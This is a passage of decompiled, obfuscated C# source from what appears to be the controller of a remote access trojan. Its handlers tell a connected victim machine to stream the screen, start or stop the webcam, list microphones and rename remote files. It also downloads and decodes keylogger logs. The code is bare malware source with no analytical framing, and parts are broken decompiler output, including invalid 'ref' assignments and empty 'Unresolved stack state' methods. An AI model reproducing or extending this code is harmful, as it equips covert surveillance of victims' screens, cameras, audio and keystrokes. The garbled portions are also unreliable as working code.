                this.vmethod_88().SelectedItem = this.vmethod_88().Items[0];
                this.vmethod_250().SelectedItem = this.vmethod_250().Items[0];
                this.vmethod_88().Enabled = true;
                this.vmethod_86().Enabled = true;
                this.vmethod_686().Enabled = true;
                this.vmethod_82().Enabled = true;
                this.vmethod_688().Enabled = true;
                this.vmethod_96().Enabled = true;
                this.vmethod_94().Enabled = true;
                this.vmethod_292().Enabled = true;
                this.vmethod_98().Enabled = true;
                this.vmethod_100().Enabled = true;
                this.vmethod_246().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_88().Items.Count > 1, true, false));
            }
        }
    }

    private void method_70(object sender, EventArgs e)
    {
        string left = string.Empty;
        GClass7 class2 = this.vmethod_720();
        int num = class2.Items.Count - 1;
        int num2 = 0;
        while (true)
        {
            bool flag;
            if (num2 <= num)
            {
                if (!class2.Items[num2].Selected)
                {
                    num2++;
                    continue;
                }
                left = Conversions.ToString(class2.Items[num2].Tag);
            }
            if (Operators.CompareString(left, string.Empty, true) == 0)
            {
                Interaction.MsgBox("No file selected!", MsgBoxStyle.Exclamation, Application.ProductName);
                return;
            }
            string str2 = Interaction.InputBox("Enter new file name", Application.ProductName, string.Empty, -1, -1);
            if (Operators.CompareString(str2, string.Empty, true) == 0)
            {
                Interaction.MsgBox("Invalid filename!", MsgBoxStyle.Exclamation, Application.ProductName);
                return;
            }
            ref int index = ref 0;
            string first = string.Empty;
            string str4 = str2;
            if (Information.IsNothing((int) index))
            {
                flag = !Enumerable.Any<char>(Enumerable.Intersect<char>(str4, Path.GetInvalidFileNameChars())) && !Enumerable.Any<char>(Enumerable.Intersect<char>(first, Path.GetInvalidPathChars()));
            }
            else
            {
                IEnumerable<char> source = Enumerable.Intersect<char>(str4, Path.GetInvalidFileNameChars());
                if (Enumerable.Any<char>(source))
                {
                    index = Strings.Len(first) + str4.IndexOf(Enumerable.First<char>(source));
                    flag = false;
                }
                else
                {
                    source = Enumerable.Intersect<char>(first, Path.GetInvalidPathChars());
                    if (!Enumerable.Any<char>(source))
                    {
                        flag = true;
                    }
                    else
                    {
                        index = first.IndexOf(Enumerable.First<char>(source));
                        flag = false;
                    }
                }
            }
            if (flag)
            {
                this.method_54(ref left, ref str2);
            }
            else
            {
                Interaction.MsgBox("Invalid filename!", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            class2 = null;
            return;
        }
    }

    private void method_71(object sender, EventArgs e)
    {
        string left = string.Empty;
        left = Conversions.ToString(this.vmethod_76().SelectedItems[0].Tag);
        if (Operators.CompareString(left, string.Empty, true) == 0)
        {
            Interaction.MsgBox("No directory selected!", MsgBoxStyle.Exclamation, Application.ProductName);
        }
        else
        {
            string str2 = Interaction.InputBox("Enter new directory name", Application.ProductName, string.Empty, -1, -1);
            if (Operators.CompareString(str2, string.Empty, true) == 0)
            {
                Interaction.MsgBox("Invalid directory name!", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else
            {
                bool flag;
                ref int index = ref 0;
                ref string path = ref str2;
                string first = string.Empty;
                string fileName = Path.GetFileName(path);
                first = Path.GetDirectoryName(path);
                if (Information.IsNothing((int) index))
                {
                    flag = !Enumerable.Any<char>(Enumerable.Intersect<char>(fileName, Path.GetInvalidFileNameChars())) && !Enumerable.Any<char>(Enumerable.Intersect<char>(first, Path.GetInvalidPathChars()));
                }
                else
                {
                    IEnumerable<char> source = Enumerable.Intersect<char>(fileName, Path.GetInvalidFileNameChars());
                    if (Enumerable.Any<char>(source))
                    {
                        index = Strings.Len(first) + fileName.IndexOf(Enumerable.First<char>(source));
                        flag = false;
                    }
                    else
                    {
                        source = Enumerable.Intersect<char>(first, Path.GetInvalidPathChars());
                        if (!Enumerable.Any<char>(source))
                        {
                            flag = true;
                        }
                        else
                        {
                            index = first.IndexOf(Enumerable.First<char>(source));
                            flag = false;
                        }
                    }
                }
                if (flag)
                {
                    this.method_54(ref left, ref str2);
                }
                else
                {
                    Interaction.MsgBox("Invalid directory name!", MsgBoxStyle.Exclamation, Application.ProductName);
                }
            }
        }
    }

    private void method_72(object sender, EventArgs e)
    {
        this.vmethod_86().Enabled = false;
        this.vmethod_88().Enabled = false;
        this.vmethod_686().Enabled = false;
        this.vmethod_82().Enabled = false;
        this.vmethod_688().Enabled = false;
        this.vmethod_96().Enabled = false;
        this.vmethod_94().Enabled = false;
        this.vmethod_292().Enabled = false;
        this.vmethod_98().Enabled = false;
        this.vmethod_100().Enabled = false;
        this.vmethod_246().Checked = false;
        this.vmethod_246().Enabled = false;
        this.vmethod_88().Enabled = false;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "monitors_refresh|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_73(object sender, ListViewItemSelectionChangedEventArgs e)
    {
    }

    private void method_74(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.string_4, null, true) != 0)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "screenlive_size|" + Conversions.ToString(Conversions.ToInteger(Strings.Replace(this.vmethod_82().Text, "%", string.Empty, 1, -1, CompareMethod.Text)));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
        this.vmethod_24().Focus();
    }

    private void method_75(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.string_4, null, true) != 0)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("screenlive_cursor|", Interaction.IIf(this.vmethod_96().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
        this.vmethod_24().Focus();
    }

    private void method_76(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.string_4, null, true) != 0)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("screenlive_color|", Interaction.IIf(this.vmethod_98().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_77(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.string_4, null, true) != 0)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = Conversions.ToString(Operators.ConcatenateObject("screenlive_color|", Interaction.IIf(this.vmethod_98().Checked, "1", "0")));
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_78(object sender, EventArgs e)
    {
        if (Operators.CompareString(this.string_4, null, true) != 0)
        {
            Class136.Class138 class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = "screenlive_monitor|" + Conversions.ToString(this.vmethod_88().SelectedIndex);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
        }
    }

    private void method_79(object sender, EventArgs e)
    {
        this.vmethod_88().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_246().Enabled, true, false));
        if (this.vmethod_246().Checked)
        {
            this.vmethod_88().Top = 0;
            this.vmethod_250().Enabled = true;
            this.vmethod_250().Visible = true;
        }
        else
        {
            this.vmethod_250().Enabled = false;
            this.vmethod_250().Visible = false;
            this.vmethod_88().Top = 8;
        }
        this.method_80();
    }

    public void method_8(ref string string_12)
    {
        if (this.vmethod_88().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_88().Invoke(new Delegate25(this.method_8), args);
        }
        else if (string_12.Equals("0"))
        {
            Interaction.MsgBox("No webcam device found!", MsgBoxStyle.Exclamation, Application.ProductName);
            this.vmethod_258().Enabled = true;
        }
        else
        {
            string[] strArray = Strings.Split(string_12, ":", -1, CompareMethod.Text);
            this.vmethod_268().Items.Clear();
            int num = strArray.Length - 1;
            for (int i = 0; i <= num; i++)
            {
                if (strArray[i].Length > 0)
                {
                    this.vmethod_268().Items.Add(Strings.Split(strArray[i], ",", -1, CompareMethod.Text)[1]);
                }
            }
            if (this.vmethod_268().Items.Count == 0)
            {
                Interaction.MsgBox("No webcam device found!", MsgBoxStyle.Exclamation, Application.ProductName);
                this.vmethod_258().Enabled = true;
            }
            else
            {
                this.vmethod_268().SelectedItem = this.vmethod_268().Items[0];
                this.vmethod_716().Enabled = true;
                this.vmethod_268().Enabled = true;
                this.vmethod_258().Enabled = true;
                this.vmethod_262().Enabled = true;
            }
        }
    }

    private void method_80()
    {
        if (!this.vmethod_246().Checked)
        {
            this.vmethod_24().Height = this.vmethod_22().Height - 50;
            this.vmethod_24().Width = this.vmethod_22().Width - 4;
            this.vmethod_248().Visible = false;
            this.vmethod_264().Height = this.vmethod_252().Height - 50;
            this.vmethod_264().Width = this.vmethod_252().Width - 4;
        }
        else
        {
            this.vmethod_24().Width = (int) Math.Round((double) ((((double) this.vmethod_22().Width) / 2.0) - 2.0));
            this.vmethod_24().Height = this.vmethod_22().Height - 50;
            this.vmethod_248().Left = (int) Math.Round((double) ((((double) this.vmethod_22().Width) / 2.0) - 1.0));
            this.vmethod_248().Width = (int) Math.Round((double) ((((double) this.vmethod_22().Width) / 2.0) - 1.0));
            this.vmethod_248().Height = this.vmethod_22().Height - 50;
            this.vmethod_248().Visible = true;
        }
    }

    private void method_81(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 4;
        this.method_41();
    }

    private void method_82(object sender, EventArgs e)
    {
        this.vmethod_258().Enabled = false;
        this.vmethod_268().Enabled = false;
        this.vmethod_262().Enabled = false;
        this.vmethod_716().Enabled = false;
        Class136.Class138 class2 = new Class136.Class138();
        class2.string_0 = this.string_4;
        class2.string_1 = "webcam_devices|1";
        class2.long_0 = 0L;
        if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
        {
            new Thread(new ThreadStart(class2._Lambda$__0)).Start();
        }
    }

    private void method_83(object sender, EventArgs e)
    {
        Class136.Class138 class2;
        if (Operators.CompareString(this.vmethod_262().Text, "Start", true) != 0)
        {
            if (Operators.CompareString(this.vmethod_262().Text, "Stop", true) == 0)
            {
                this.vmethod_262().Enabled = false;
                class2 = new Class136.Class138();
                class2.string_0 = this.string_4;
                class2.string_1 = "webcam_stop|1";
                class2.long_0 = 0L;
                if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
                {
                    new Thread(new ThreadStart(class2._Lambda$__0)).Start();
                }
                if (Class130.concurrentDictionary_3.ContainsKey(this.string_4) && (Class130.concurrentDictionary_3.ContainsKey(Class130.concurrentDictionary_3[this.string_4].WEBCAMSTREAM_SOCKET_ID) && Class130.concurrentDictionary_3.ContainsKey(Class130.concurrentDictionary_3[this.string_4].WEBCAMSTREAM_SOCKET_ID)))
                {
                    Class130.concurrentDictionary_3[Class130.concurrentDictionary_3[this.string_4].WEBCAMSTREAM_SOCKET_ID].SOCKET_DISCONNECT(ref true);
                }
            }
        }
        else
        {
            Class130.concurrentDictionary_3[this.string_4].WEBCAM_IS_STREAMING = true;
            string[] textArray1 = new string[] { "webcam_start|", this.string_4, "|", Conversions.ToString((int) (this.vmethod_268().SelectedIndex + 1)), "|", Conversions.ToString(this.vmethod_716().Value) };
            class2 = new Class136.Class138();
            class2.string_0 = this.string_4;
            class2.string_1 = string.Concat(textArray1);
            class2.long_0 = 0L;
            if (Class130.concurrentDictionary_3.ContainsKey(class2.string_0))
            {
                new Thread(new ThreadStart(class2._Lambda$__0)).Start();
            }
            this.vmethod_262().Text = "Stop";
            this.vmethod_258().Enabled = false;
            this.vmethod_268().Enabled = false;
        }
    }

    private void method_84(object sender, ListViewItemSelectionChangedEventArgs e)
    {
        this.vmethod_104().Enabled = Conversions.ToBoolean(Interaction.IIf(this.string_8.Length >= 3, true, false));
        this.vmethod_108().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
        this.vmethod_144().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
        this.vmethod_172().Enabled = Conversions.ToBoolean(Interaction.IIf(this.vmethod_720().SelectedItems.Count > 0, true, false));
    }

    private void method_85(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 6;
        this.method_41();
    }

    private void method_86(object sender, EventArgs e)
    {
        this.vmethod_18().SelectedIndex = 5;
        this.method_41();
    }

    public void method_87(ref string string_12)
    {
        if (this.vmethod_388().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_388().Invoke(new Delegate40(this.method_87), args);
        }
        else
        {
            long num2;
            double num4;
            ref bool flagRef;
            string str;
            int num6;
            string str2;
            string[] strArray3;
            string_12 = Encoding.UTF8.GetString(Convert.FromBase64String(string_12));
            this.vmethod_388().Items.Clear();
            this.vmethod_556().Visible = false;
            this.vmethod_556().SendToBack();
            if (Operators.CompareString(string_12, "0", true) != 0)
            {
                string[] strArray2 = Strings.Split(string_12, "|", -1, CompareMethod.Text);
                int num3 = strArray2.Length - 1;
                for (int i = 0; i <= num3; i++)
                {
                    if (strArray2[i].Length > 0)
                    {
                        string[] strArray = Strings.Split(strArray2[i], ":", -1, CompareMethod.Text);
                        this.vmethod_388().Items.Add(strArray[0], Strings.Replace(strArray[0], ".bin", string.Empty, 1, -1, CompareMethod.Text), 0);
                        this.vmethod_388().Items[strArray[0]].Tag = strArray[0];
                        flagRef = ref false;
                        num4 = Conversions.ToDouble(strArray[1]);
                        ListViewItem.ListViewSubItemCollection subItems = this.vmethod_388().Items[strArray[0]].SubItems;
                        ProjectData.ClearProjectError();
                        str2 = string.Empty;
                        if (num4 >= 1099511627776)
                        {
                            str2 = Strings.Format((((num4 / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
                        }
                        else if (num4 >= 1073741824.0)
                        {
                            str2 = Strings.Format(((num4 / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
                        }
                        else if (num4 >= 1048576.0)
                        {
                            str2 = Strings.Format((num4 / 1024.0) / 1024.0, "#0.00") + " MiB";
                        }
                        else if (num4 >= 1024.0)
                        {
                            str2 = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
                        }
                        else if (num4 < 1024.0)
                        {
                            str2 = Conversions.ToString(Conversion.Fix(num4)) + " B";
                        }
                        if (flagRef)
                        {
                            str2 = Strings.Split(str2, " ", -1, CompareMethod.Text)[0];
                        }
                        str = (str2.Length <= 0) ? " 0 B" : str2;
                        if (num6 != 0)
                        {
                            ProjectData.ClearProjectError();
                        }
                        subItems.Add(str);
                        num2 = (long) Math.Round((double) (num2 + Conversion.Val(strArray[1])));
                    }
                }
            }
            this.vmethod_280().Enabled = true;
            this.vmethod_388().Enabled = true;
            this.vmethod_704().Enabled = true;
            this.vmethod_702().Enabled = true;
            this.vmethod_712().Enabled = true;
            string[] textArray1 = new string[5];
            textArray1[0] = "Logs: ";
            textArray1[1] = Conversions.ToString(this.vmethod_388().Items.Count);
            textArray1[2] = " (";
            flagRef = ref false;
            num4 = num2;
            int index = 3;
            string[] strArray4 = strArray3 = textArray1;
            ToolStripStatusLabel label = this.vmethod_484();
            ProjectData.ClearProjectError();
            str2 = string.Empty;
            if (num4 >= 1099511627776)
            {
                str2 = Strings.Format((((num4 / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
            }
            else if (num4 >= 1073741824.0)
            {
                str2 = Strings.Format(((num4 / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
            }
            else if (num4 >= 1048576.0)
            {
                str2 = Strings.Format((num4 / 1024.0) / 1024.0, "#0.00") + " MiB";
            }
            else if (num4 >= 1024.0)
            {
                str2 = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
            }
            else if (num4 < 1024.0)
            {
                str2 = Conversions.ToString(Conversion.Fix(num4)) + " B";
            }
            if (flagRef)
            {
                str2 = Strings.Split(str2, " ", -1, CompareMethod.Text)[0];
            }
            str = (str2.Length <= 0) ? " 0 B" : str2;
            if (num6 != 0)
            {
                ProjectData.ClearProjectError();
            }
            strArray3[index] = str;
            strArray4[4] = ")";
            label.Text = string.Concat(strArray4);
        }
    }

    public void method_88(ref string string_12)
    {
        if (this.vmethod_280().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_280().Invoke(new Delegate36(this.method_88), args);
        }
        else
        {
            this.vmethod_492().Value = 0;
            this.vmethod_492().Maximum = 100;
            this.vmethod_556().Visible = false;
            this.vmethod_556().SendToBack();
            this.vmethod_290().set_Value(0);
            this.vmethod_290().set_MaximumValue(100);
            this.vmethod_290().Visible = true;
            this.vmethod_290().set_ShowText(true);
            this.vmethod_290().Left = (int) Math.Round((double) ((this.vmethod_280().Left + (((double) this.vmethod_280().Width) / 2.0)) - (((double) this.vmethod_290().Width) / 2.0)));
            this.vmethod_290().Top = (int) Math.Round((double) ((this.vmethod_280().Top + (((double) this.vmethod_280().Height) / 2.0)) - (((double) this.vmethod_290().Height) / 2.0)));
            this.vmethod_282().RunWorkerAsync(string_12);
        }
    }

    private void method_89(object sender, DoWorkEventArgs e)
    {
        int num2;
        ProjectData.ClearProjectError();
        string str3 = Strings.Replace(Conversions.ToString(e.Argument), "\0", string.Empty, 1, -1, CompareMethod.Text);
        XmlDocument document = new XmlDocument();
        document.LoadXml("<root>" + str3 + "</root>");
        XmlNodeList elementsByTagName = document.GetElementsByTagName("block");
        this.stringBuilder_0.Clear();
        this.string_10 = null;
        this.string_11 = null;
        IEnumerator enumerator = elementsByTagName.GetEnumerator();
        while (enumerator.MoveNext())
        {
            long num4;
            XmlNode current = (XmlNode) enumerator.Current;
            XmlNode node2 = current.SelectSingleNode("title");
            XmlNode node3 = current.SelectSingleNode("date");
            XmlNode node4 = current.SelectSingleNode("data");
            string expression = string.Empty;
            string str2 = string.Empty;
            string str4 = string.Empty;
            if (node2 != null)
            {
                str2 = this.method_102(ref Encoding.UTF8.GetString(Convert.FromBase64String(node2.InnerText)));
            }
            if (node3 != null)
            {
                expression = this.method_102(ref Encoding.UTF8.GetString(Convert.FromBase64String(node3.InnerText)));
            }
            if (node4 != null)
            {
                str4 = this.method_102(ref Encoding.UTF8.GetString(Convert.FromBase64String(node4.InnerText)));
            }
            if ((Strings.Len(expression) > 0) & (Operators.CompareString(this.string_10, null, true) == 0))
            {
                this.string_10 = expression;
            }
            if (Strings.Len(expression) > 0)
            {
                this.string_11 = expression;
            }
            if (Strings.Len(str2) > 0)
            {
                if (this.stringBuilder_0.Length > 0)
                {
                    this.stringBuilder_0.Append("\r\n\r\n");
                }
                this.stringBuilder_0.Append(str2 + " [" + expression + "]\r\n");
                if (Class135.smethod_0().ConKlgColors && (this.stringBuilder_0.Length > 0))
                {
                    this.method_91("\r\n\r\n");
                }
                if (Class135.smethod_0().ConKlgColors)
                {
                    this.method_90(str2, Color.Green);
                }
                if (Class135.smethod_0().ConKlgColors)
                {
                    string str7 = " [" + expression + "]\r\n";
                    this.method_90(str7, Color.DeepSkyBlue);
                }
            }
            this.stringBuilder_0.Append(str4);
            if (Class135.smethod_0().ConKlgColors)
            {
                this.method_91(str4);
            }
            num4 += 1L;
            this.vmethod_282().ReportProgress((int) Math.Round(Conversion.Val((((double) num4) / ((double) elementsByTagName.Count)) * 100.0)));
        }
        if (enumerator is IDisposable)
        {
            (enumerator as IDisposable).Dispose();
        }
        if (num2 != 0)
        {
            ProjectData.ClearProjectError();
        }
    }

    public void method_9(ref bool bool_3)
    {
        // Unresolved stack state at '0000000D'
    }

    public void method_90(string string_12, Color color_0)
    {
        // Unresolved stack state at '0000000D'
    }

    public void method_91(string string_12)
    {
        if (this.vmethod_280().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_280().Invoke(new Delegate28(this.method_91), args);
        }
        else
        {
            this.vmethod_280().Enabled = true;
            this.vmethod_280().ReadOnly = true;
            this.vmethod_280().AppendText(string_12);
        }
    }

    private void method_92(object sender, ProgressChangedEventArgs e)
    {
        if (e.ProgressPercentage > this.vmethod_492().Value)
        {
            this.vmethod_492().Value = e.ProgressPercentage;
            this.vmethod_290().set_Value(e.ProgressPercentage);
            this.vmethod_290().Update();
        }
    }

    private void method_93(object sender, RunWorkerCompletedEventArgs e)
    {
        int num3;
        this.vmethod_492().Value = 0;
        ref bool flagRef = ref false;
        double length = this.stringBuilder_0.Length;
        string str3 = "Current log size: ";
        int num4 = (int) (this.stringBuilder_0.Length > 0);
        ToolStripStatusLabel label = this.vmethod_486();
        ProjectData.ClearProjectError();
        string expression = string.Empty;
        if (length >= 1099511627776)
        {
            expression = Strings.Format((((length / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
        }
        else if (length >= 1073741824.0)
        {
            expression = Strings.Format(((length / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
        }
        else if (length >= 1048576.0)
        {
            expression = Strings.Format((length / 1024.0) / 1024.0, "#0.00") + " MiB";
        }
        else if (length >= 1024.0)
        {
            expression = Strings.Format(length / 1024.0, "#0.00") + " KiB";
        }
        else if (length < 1024.0)
        {
            expression = Conversions.ToString(Conversion.Fix(length)) + " B";
        }
        if (flagRef)
        {
            expression = Strings.Split(expression, " ", -1, CompareMethod.Text)[0];
        }
        string str = (expression.Length <= 0) ? " 0 B" : expression;
        if (num3 != 0)
        {
            ProjectData.ClearProjectError();
        }
        flagRef = ref false;
        length = 0.0;
        string str5 = "Current lize: ";
        string truePart = str3 + str;
        int num5 = num4;
        ToolStripStatusLabel label2 = label;
        ProjectData.ClearProjectError();
        expression = string.Empty;
        if (length >= 1099511627776)
        {
            expression = Strings.Format((((length / 1024.0) / 1024.0) / 1024.0) / 1024.0, "#0.00") + " TiB";
        }
        else if (length >= 1073741824.0)
        {
            expression = Strings.Format(((length / 1024.0) / 1024.0) / 1024.0, "#0.00") + " GiB";
        }
        else if (length >= 1048576.0)
        {
            expression = Strings.Format((length / 1024.0) / 1024.0, "#0.00") + " MiB";
        }
        else if (length >= 1024.0)
        {
            expression = Strings.Format(length / 1024.0, "#0.00") + " KiB";
        }
        else if (length < 1024.0)
        {
            expression = Conversions.ToString(Conversion.Fix(length)) + " B";
        }
        if (flagRef)
        {
            expression = Strings.Split(expression, " ", -1, CompareMethod.Text)[0];
        }
        str = (expression.Length <= 0) ? " 0 B" : expression;
        if (num3 != 0)
        {
            ProjectData.ClearProjectError();
        }
        label2.Text = Conversions.ToString(Operators.ConcatenateObject(Interaction.IIf((bool) num5, truePart, str5 + str), " (decoded)"));
        if (this.stringBuilder_0.Length == 0)
        {
            this.stringBuilder_0.Clear();
            this.stringBuilder_0.Append("No logs available!");
        }
        this.vmethod_556().Visible = false;
        this.vmethod_556().SendToBack();
        this.vmethod_280().Enabled = true;
        this.vmethod_388().Enabled = true;
        this.vmethod_704().Enabled = true;
        this.vmethod_712().Enabled = true;
        this.vmethod_702().Enabled = true;
        this.vmethod_290().Visible = false;
        this.vmethod_290().set_Value(0);
        this.vmethod_492().Value = 0;
        this.vmethod_488().Text = Conversions.ToString(Interaction.IIf(ReferenceEquals(this.string_10, null), "Creation date: N/A", "Creation date: " + this.string_10));
        this.vmethod_490().Text = Conversions.ToString(Interaction.IIf(ReferenceEquals(this.string_11, null), "Last updated: N/A", "Last updated: " + this.string_11));
        if ((this.string_10 != null) && ((this.string_11.Length > 0) & (this.string_11.Length > 0)))
        {
            this.vmethod_386().Text = (Operators.CompareString(Strings.Split(this.string_10, " ", -1, CompareMethod.Text)[0], Strings.Split(this.string_11, " ", -1, CompareMethod.Text)[0], true) == 0) ? ("Current log: " + Strings.Split(this.string_10, " ", -1, CompareMethod.Text)[0]) : ("Current log: " + Strings.Split(this.string_10, " ", -1, CompareMethod.Text)[0] + " to " + Strings.Split(this.string_11, " ", -1, CompareMethod.Text)[0]);
        }
        this.vmethod_280().Enabled = true;
        this.vmethod_280().ReadOnly = true;
        if (!Class135.smethod_0().ConKlgColors)
        {
            this.vmethod_280().Text = this.stringBuilder_0.ToString();
        }
    }

    private void method_94(object sender, EventArgs e)
    {
        this.vmethod_288().Tag = Conversion.Val(this.vmethod_288().Tag) + 1.0;
        this.vmethod_478().Text = "Duration: " + Class136.smethod_35((long) Math.Round(Conversion.Val(this.vmethod_288().Tag)), true);
    }

    public void method_95(ref string string_12)
    {
        if (this.vmethod_280().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_280().Invoke(new Delegate3(this.method_95), args);
        }
        else
        {
            if (Operators.CompareString(string_12, "0", true) != 0)
            {
                this.vmethod_388().SelectedItems.Clear();
                this.vmethod_388().Items[string_12].BackColor = Color.Red;
            }
            this.vmethod_556().Visible = false;
            this.vmethod_556().SendToBack();
            this.vmethod_280().Enabled = true;
            this.vmethod_388().Enabled = true;
            this.vmethod_712().Enabled = true;
            this.vmethod_702().Enabled = true;
            this.vmethod_704().Enabled = true;
        }
    }

    public void method_96(ref string string_12)
    {
        if (this.vmethod_326().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_326().Invoke(new Delegate16(this.method_96), args);
        }
        else
        {
            this.vmethod_326().Items.Clear();
            this.vmethod_694().Enabled = true;
            if (Operators.CompareString(string_12, "0", true) == 0)
            {
                this.vmethod_326().Enabled = false;
                this.vmethod_304().Enabled = false;
                this.vmethod_320().Enabled = false;
                this.vmethod_692().Enabled = false;
                this.vmethod_330().Enabled = false;
                Interaction.MsgBox("No audio input device found!", MsgBoxStyle.Exclamation, Application.ProductName);
            }
            else
            {
                string[] strArray = Strings.Split(string_12, "@", -1, CompareMethod.Text);
                int num = strArray.Length - 1;
                for (int i = 0; i <= num; i++)
                {
                    if (strArray[i].Length > 0)
                    {
                        this.vmethod_326().Items.Add(strArray[i]);
                    }
                }
                this.vmethod_326().Enabled = true;
                this.vmethod_326().SelectedItem = this.vmethod_326().Items[0];
                this.vmethod_304().Enabled = true;
                this.vmethod_320().Enabled = true;
                this.vmethod_692().Enabled = true;
                this.vmethod_330().Enabled = true;
            }
        }
    }

    public void method_97()
    {
        if (this.vmethod_708().InvokeRequired)
        {
            this.vmethod_708().Invoke(new Delegate27(this.method_97), new object[0]);
        }
        else
        {
            this.vmethod_708().Text = "Start";
            this.vmethod_708().Refresh();
            this.vmethod_708().Enabled = true;
        }
    }

    public void method_98(ref string string_12)
    {
        if (this.vmethod_466().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_466().Invoke(new Delegate22(this.method_98), args);
        }
        else
        {
            this.vmethod_466().ReadOnly = true;
            this.vmethod_466().AppendText(string_12 + "\r\n");
            this.vmethod_466().SelectionStart = Strings.Len(this.vmethod_466().Text);
            this.vmethod_466().ScrollToCaret();
        }
    }

    public void method_99(ref string string_12)
    {
        if (this.vmethod_466().InvokeRequired)
        {
            object[] args = new object[] { string_12 };
            this.vmethod_466().Invoke(new Delegate10(this.method_99), args);
        }
        else
        {
            this.vmethod_466().ReadOnly = true;
            this.vmethod_466().AppendText(string_12 + "\r\n");
            this.vmethod_708().Enabled = true;
        }
    }

    [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    public static extern bool MoveWindow(int int_6, long long_1, long long_2, long long_3, long long_4, bool bool_3);
    [DllImport("user32", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    private static extern long RemoveMenu(long long_1, long long_2, long long_3);
    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern int SendMessage(IntPtr intptr_0, int int_6, int int_7, int int_8);
    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    public static extern int SetParent(IntPtr intptr_0, IntPtr intptr_1);
    [DllImport("user32.dll", CharSet=CharSet.Auto, SetLastError=true)]
    private static extern bool ShowWindow(IntPtr intptr_0, int int_6);
    internal virtual MenuStrip vmethod_0()
    {
        return this.menuStrip_0;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_1(MenuStrip menuStrip_1)
    {
        ToolStripItemClickedEventHandler handler = new ToolStripItemClickedEventHandler(this.method_247);
        MenuStrip strip = this.menuStrip_0;
        if (strip != null)
        {
            strip.ItemClicked -= handler;
        }
        this.menuStrip_0 = menuStrip_1;
        strip = this.menuStrip_0;
        if (strip != null)
        {
            strip.ItemClicked += handler;
        }
    }

    internal virtual ToolStripSeparator vmethod_10()
    {
        return this.toolStripSeparator_0;
    }

    internal virtual RadioButton vmethod_100()
    {
        return this.radioButton_1;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_101(RadioButton radioButton_2)
    {
        EventHandler handler = new EventHandler(this.method_77);
        KeyEventHandler handler2 = new KeyEventHandler(this.method_179);
        RadioButton button = this.radioButton_1;
        if (button != null)
        {
            button.CheckedChanged -= handler;
            button.KeyDown -= handler2;
        }
        this.radioButton_1 = radioButton_2;
        button = this.radioButton_1;
        if (button != null)
        {
            button.CheckedChanged += handler;
            button.KeyDown += handler2;
        }
    }

    internal virtual ContextMenuStrip vmethod_102()
    {
        return this.contextMenuStrip_3;
    }

    [MethodImpl(MethodImplOptions.Synchronized)]
    internal virtual void vmethod_103(ContextMenuStrip contextMenuStrip_14)
    {
        this.contextMenuStrip_3 = contextMenuStrip_14;
    }

